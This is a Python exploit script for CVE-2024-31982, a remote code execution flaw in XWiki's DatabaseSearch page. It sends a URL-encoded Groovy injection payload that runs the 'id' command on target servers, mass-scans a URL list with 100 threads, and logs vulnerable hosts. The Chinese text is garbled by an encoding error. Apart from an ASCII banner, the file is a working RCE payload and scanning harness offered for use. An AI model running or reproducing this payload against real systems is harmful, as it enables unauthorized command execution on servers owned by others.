#XWiki DatabaseSearch è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´
import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'
def banner():
    text='''                             
,-.----.     ,----..      ,---,. 
\    /  \   /   /   \   ,'  .' | 
;   :    \ |   :     :,---.'   | 
|   | .\ : .   |  ;. /|   |   .' 
.   : |: | .   ; /--` :   :  |-, 
|   |  \ : ;   | ;    :   |  ;/| 
|   : .  / |   : |    |   :   .' 
;   | |  \ .   | '___ |   |  |-, 
|   | ;\  \'   ; : .'|'   :  ;/| 
:   ' | \.''   | '/  :|   |    \ 
:   : :-'  |   :    / |   :   .' 
|   |.'     \   \ .'  |   | ,'   
`---'        `---`    `----'     
                                 
                                                 
                                version:CVE-2024-31982 1.0
                                Author: LaowğŸš¦
'''
    print(text)

def main():
    banner()
    parser = argparse.ArgumentParser(description="XWiki DatabaseSearch è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    # print(args.url)
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = "/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20"
    url = target + url_payload
    # print(url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", 
        "Accept": "application/json, text/javascript, */*; q=0.01", 
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2", 
        "Accept-Encoding": "gzip, deflate", "Connection": "close"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    try:
        response = requests.get(url=url,headers=headers,proxies=proxies,timeout=5)
        if response.status_code == 200 and 'uid' in response.text and 'groups' in response.text:
            print(f"{GREEN}[+] {url} å­˜åœ¨RCEæ¼æ´ï¼{RESET}")
            with open('result.txt','w')as f:
                f.write(target+'\n')
                return True
        else:
            print("[-]æ¼æ´ä¸å­˜åœ¨")
            return False
    except Exception:
        return("ç«™ç‚¹å­˜åœ¨é—®é¢˜ï¼ï¼")
            

if __name__ == '__main__':
    main()
